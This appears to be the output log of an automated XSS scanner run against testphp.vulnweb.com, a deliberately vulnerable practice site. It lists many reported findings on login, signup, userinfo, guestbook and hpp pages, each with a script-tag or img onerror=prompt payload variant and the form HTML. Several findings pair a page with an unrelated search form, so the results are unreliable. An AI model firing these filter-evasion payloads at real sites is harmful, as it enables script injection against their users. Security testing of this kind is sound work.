+***** XSS vulnerability discovered in http://testphp.vulnweb.com/guestbook.php in the following form *****
+
+ Script used --> < img src = q onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/login.php
+--> Testing form in http://testphp.vulnweb.com/login.php
+--> Testing form in http://testphp.vulnweb.com/login.php
+--> Testing form in http://testphp.vulnweb.com/login.php
+--> Testing form in http://testphp.vulnweb.com/login.php
+--> Testing form in http://testphp.vulnweb.com/login.php
+--> Testing form in http://testphp.vulnweb.com/login.php
+--> Testing form in http://testphp.vulnweb.com/login.php
+--> Testing form in http://testphp.vulnweb.com/login.php
+--> Testing form in http://testphp.vulnweb.com/login.php
+--> Testing form in http://testphp.vulnweb.com/login.php
+--> Testing form in http://testphp.vulnweb.com/login.php
+--> Testing form in http://testphp.vulnweb.com/login.php
+--> Testing form in http://testphp.vulnweb.com/login.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/login.php in the following form *****
+
+ Script used --> <script type='text/javascript'>javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/login.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/login.php in the following form *****
+
+ Script used --> <sCript>type='text/javascript'>javascript:alert(1);</scrIpt>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/login.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/login.php in the following form *****
+
+type='text/javascript'>javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/login.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/login.php in the following form *****
+
+ Script used --> <sCript        type="text/javascript">javascript:alert(1);</scriPt>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/login.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/login.php in the following form *****
+
+ Script used --> <script
+type="text/javascript">javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/login.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/login.php in the following form *****
+
+ Script used --> <script/type="text/javascript">javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/login.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/login.php in the following form *****
+
+ Script used --> <script
+type="text/javascript">javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/login.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/login.php in the following form *****
+
+ Script used --> < image / src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/login.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/login.php in the following form *****
+
+ Script used --> < img / src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/login.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/login.php in the following form *****
+
+ Script used --> < image src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/login.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/login.php in the following form *****
+
+ Script used --> < img src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/login.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/login.php in the following form *****
+
+ Script used --> < image src = q onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/login.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/login.php in the following form *****
+
+ Script used --> < img src = q onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+--> Testing form in http://testphp.vulnweb.com/signup.php
+--> Testing form in http://testphp.vulnweb.com/signup.php
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> <sCript        type="text/javascript">javascript:alert(1);</scriPt>
+<form action="/secured/newuser.php" method="post" name="form1">
+<table border="0" cellpadding="4" cellspacing="1">
+<tr><td valign="top">Username:</td><td><input name="uuname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Password:</td><td><input name="upass" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Retype password:</td><td><input name="upass2" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Name:</td><td><input name="urname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Credit card number:</td><td><input name="ucc" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">E-Mail:</td><td><input name="uemail" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Phone number:</td><td><input name="uphone" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Address:</td><td><textarea name="uaddress" rows="5" style="width:200px" wrap="soft"></textarea></td></tr>
+<tr><td align="right" colspan="2"><input name="signup" type="submit" value="signup"/></td></tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> <script
+type="text/javascript">javascript:alert(1);</script>
+<form action="/secured/newuser.php" method="post" name="form1">
+<table border="0" cellpadding="4" cellspacing="1">
+<tr><td valign="top">Username:</td><td><input name="uuname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Password:</td><td><input name="upass" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Retype password:</td><td><input name="upass2" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Name:</td><td><input name="urname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Credit card number:</td><td><input name="ucc" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">E-Mail:</td><td><input name="uemail" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Phone number:</td><td><input name="uphone" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Address:</td><td><textarea name="uaddress" rows="5" style="width:200px" wrap="soft"></textarea></td></tr>
+<tr><td align="right" colspan="2"><input name="signup" type="submit" value="signup"/></td></tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> <script/type="text/javascript">javascript:alert(1);</script>
+<form action="/secured/newuser.php" method="post" name="form1">
+<table border="0" cellpadding="4" cellspacing="1">
+<tr><td valign="top">Username:</td><td><input name="uuname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Password:</td><td><input name="upass" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Retype password:</td><td><input name="upass2" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Name:</td><td><input name="urname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Credit card number:</td><td><input name="ucc" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">E-Mail:</td><td><input name="uemail" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Phone number:</td><td><input name="uphone" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Address:</td><td><textarea name="uaddress" rows="5" style="width:200px" wrap="soft"></textarea></td></tr>
+<tr><td align="right" colspan="2"><input name="signup" type="submit" value="signup"/></td></tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> <script
+type="text/javascript">javascript:alert(1);</script>
+<form action="/secured/newuser.php" method="post" name="form1">
+<table border="0" cellpadding="4" cellspacing="1">
+<tr><td valign="top">Username:</td><td><input name="uuname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Password:</td><td><input name="upass" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Retype password:</td><td><input name="upass2" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Name:</td><td><input name="urname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Credit card number:</td><td><input name="ucc" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">E-Mail:</td><td><input name="uemail" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Phone number:</td><td><input name="uphone" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Address:</td><td><textarea name="uaddress" rows="5" style="width:200px" wrap="soft"></textarea></td></tr>
+<tr><td align="right" colspan="2"><input name="signup" type="submit" value="signup"/></td></tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> < image / src / onerror = prompt(8) >
+<form action="/secured/newuser.php" method="post" name="form1">
+<table border="0" cellpadding="4" cellspacing="1">
+<tr><td valign="top">Username:</td><td><input name="uuname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Password:</td><td><input name="upass" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Retype password:</td><td><input name="upass2" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Name:</td><td><input name="urname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Credit card number:</td><td><input name="ucc" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">E-Mail:</td><td><input name="uemail" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Phone number:</td><td><input name="uphone" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Address:</td><td><textarea name="uaddress" rows="5" style="width:200px" wrap="soft"></textarea></td></tr>
+<tr><td align="right" colspan="2"><input name="signup" type="submit" value="signup"/></td></tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> < img / src / onerror = prompt(8) >
+<form action="/secured/newuser.php" method="post" name="form1">
+<table border="0" cellpadding="4" cellspacing="1">
+<tr><td valign="top">Username:</td><td><input name="uuname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Password:</td><td><input name="upass" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Retype password:</td><td><input name="upass2" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Name:</td><td><input name="urname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Credit card number:</td><td><input name="ucc" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">E-Mail:</td><td><input name="uemail" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Phone number:</td><td><input name="uphone" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Address:</td><td><textarea name="uaddress" rows="5" style="width:200px" wrap="soft"></textarea></td></tr>
+<tr><td align="right" colspan="2"><input name="signup" type="submit" value="signup"/></td></tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> < image src / onerror = prompt(8) >
+<form action="/secured/newuser.php" method="post" name="form1">
+<table border="0" cellpadding="4" cellspacing="1">
+<tr><td valign="top">Username:</td><td><input name="uuname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Password:</td><td><input name="upass" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Retype password:</td><td><input name="upass2" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Name:</td><td><input name="urname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Credit card number:</td><td><input name="ucc" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">E-Mail:</td><td><input name="uemail" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Phone number:</td><td><input name="uphone" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Address:</td><td><textarea name="uaddress" rows="5" style="width:200px" wrap="soft"></textarea></td></tr>
+<tr><td align="right" colspan="2"><input name="signup" type="submit" value="signup"/></td></tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> < img src / onerror = prompt(8) >
+<form action="/secured/newuser.php" method="post" name="form1">
+<table border="0" cellpadding="4" cellspacing="1">
+<tr><td valign="top">Username:</td><td><input name="uuname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Password:</td><td><input name="upass" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Retype password:</td><td><input name="upass2" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Name:</td><td><input name="urname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Credit card number:</td><td><input name="ucc" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">E-Mail:</td><td><input name="uemail" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Phone number:</td><td><input name="uphone" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Address:</td><td><textarea name="uaddress" rows="5" style="width:200px" wrap="soft"></textarea></td></tr>
+<tr><td align="right" colspan="2"><input name="signup" type="submit" value="signup"/></td></tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> < image src = q onerror = prompt(8) >
+<form action="/secured/newuser.php" method="post" name="form1">
+<table border="0" cellpadding="4" cellspacing="1">
+<tr><td valign="top">Username:</td><td><input name="uuname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Password:</td><td><input name="upass" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Retype password:</td><td><input name="upass2" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Name:</td><td><input name="urname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Credit card number:</td><td><input name="ucc" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">E-Mail:</td><td><input name="uemail" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Phone number:</td><td><input name="uphone" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Address:</td><td><textarea name="uaddress" rows="5" style="width:200px" wrap="soft"></textarea></td></tr>
+<tr><td align="right" colspan="2"><input name="signup" type="submit" value="signup"/></td></tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> < img src = q onerror = prompt(8) >
+<form action="/secured/newuser.php" method="post" name="form1">
+<table border="0" cellpadding="4" cellspacing="1">
+<tr><td valign="top">Username:</td><td><input name="uuname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Password:</td><td><input name="upass" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Retype password:</td><td><input name="upass2" style="width:200px" type="password"/></td></tr>
+<tr><td valign="top">Name:</td><td><input name="urname" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Credit card number:</td><td><input name="ucc" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">E-Mail:</td><td><input name="uemail" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Phone number:</td><td><input name="uphone" style="width:200px" type="text"/></td></tr>
+<tr><td valign="top">Address:</td><td><textarea name="uaddress" rows="5" style="width:200px" wrap="soft"></textarea></td></tr>
+<tr><td align="right" colspan="2"><input name="signup" type="submit" value="signup"/></td></tr>
+</table>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> <script type='text/javascript'>javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> <sCript>type='text/javascript'>javascript:alert(1);</scrIpt>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+type='text/javascript'>javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> <sCript        type="text/javascript">javascript:alert(1);</scriPt>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> <script
+type="text/javascript">javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> <script/type="text/javascript">javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> <script
+type="text/javascript">javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> < image / src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> < img / src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> < image src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> < img src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> < image src = q onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/signup.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/signup.php in the following form *****
+
+ Script used --> < img src = q onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/userinfo.php in the following form *****
+
+ Script used --> <script type='text/javascript'>javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/userinfo.php in the following form *****
+
+ Script used --> <sCript>type='text/javascript'>javascript:alert(1);</scrIpt>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/userinfo.php in the following form *****
+
+type='text/javascript'>javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/userinfo.php in the following form *****
+
+ Script used --> <sCript        type="text/javascript">javascript:alert(1);</scriPt>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/userinfo.php in the following form *****
+
+ Script used --> <script
+type="text/javascript">javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/userinfo.php in the following form *****
+
+ Script used --> <script/type="text/javascript">javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/userinfo.php in the following form *****
+
+ Script used --> <script
+type="text/javascript">javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/userinfo.php in the following form *****
+
+ Script used --> < image / src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/userinfo.php in the following form *****
+
+ Script used --> < img / src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/userinfo.php in the following form *****
+
+ Script used --> < image src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/userinfo.php in the following form *****
+
+ Script used --> < img src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/userinfo.php in the following form *****
+
+ Script used --> < image src = q onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/userinfo.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/userinfo.php in the following form *****
+
+ Script used --> < img src = q onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/hpp/?pp=12
+
+
+--> Testing http://testphp.vulnweb.com/hpp/?pp=12
+***** Discovered XSS in http://testphp.vulnweb.com/hpp/?pp=12*****
+
+ Script used --> <script type='text/javascript'>javascript:alert(1);</script>
+<form action="params.php?p=valid&amp;pp=12"><input name="aaaa/" type="submit"/></form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/hpp/?pp=12
+
+
+--> Testing http://testphp.vulnweb.com/hpp/?pp=12
+***** Discovered XSS in http://testphp.vulnweb.com/hpp/?pp=12*****
+
+ Script used --> <sCript>type='text/javascript'>javascript:alert(1);</scrIpt>
+<form action="params.php?p=valid&amp;pp=12"><input name="aaaa/" type="submit"/></form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/hpp/?pp=12
+
+
+--> Testing http://testphp.vulnweb.com/hpp/?pp=12
+***** Discovered XSS in http://testphp.vulnweb.com/hpp/?pp=12*****
+
+type='text/javascript'>javascript:alert(1);</script>
+<form action="params.php?p=valid&amp;pp=12"><input name="aaaa/" type="submit"/></form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/hpp/?pp=12
+
+
+--> Testing http://testphp.vulnweb.com/hpp/?pp=12
+***** Discovered XSS in http://testphp.vulnweb.com/hpp/?pp=12*****
+
+ Script used --> <sCript        type="text/javascript">javascript:alert(1);</scriPt>
+<form action="params.php?p=valid&amp;pp=12"><input name="aaaa/" type="submit"/></form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/hpp/?pp=12
+
+
+--> Testing http://testphp.vulnweb.com/hpp/?pp=12
+***** Discovered XSS in http://testphp.vulnweb.com/hpp/?pp=12*****
+
+ Script used --> <script
+type="text/javascript">javascript:alert(1);</script>
+<form action="params.php?p=valid&amp;pp=12"><input name="aaaa/" type="submit"/></form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/hpp/?pp=12
+
+
+--> Testing http://testphp.vulnweb.com/hpp/?pp=12
+***** Discovered XSS in http://testphp.vulnweb.com/hpp/?pp=12*****
+
